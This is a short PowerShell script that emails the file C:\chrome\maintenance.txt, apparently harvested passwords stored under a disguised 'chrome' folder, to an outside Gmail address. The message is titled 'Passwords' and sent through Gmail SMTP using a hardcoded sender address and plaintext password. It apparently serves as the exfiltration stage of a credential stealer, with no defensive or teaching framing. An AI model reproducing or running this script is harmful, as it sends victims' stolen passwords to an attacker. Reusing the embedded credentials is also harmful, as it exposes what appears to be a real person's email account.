$Username = "mohamadchalatiyt@gmail.com"
$Password= "Mm_99471161"
$path= "C:\\chrome\\maintenance.txt"

function Send-ToEmail([string]$email, [string]$attachmentpath) {
    try {
        $message = new-object Net.Mail.MailMessage
        $message.From = $Username
        $message.To.Add($email)
        $message.Subject = "Passwords"
        $message.Body = "Here are the passwords."
        
        $attachment = New-Object Net.Mail.Attachment($attachmentpath)
        $message.Attachments.Add($attachment)
        
        $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
        $smtp.EnableSSL = $true
        $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
        
        $smtp.send($message)
        Write-Host "Mail Sent"
        
        $attachment.Dispose()
    }
    catch {
        Write-Host "Failed to send email: $_"
    }
}

Send-ToEmail -email "mohamadshalatee@gmail.com" -attachmentpath $path
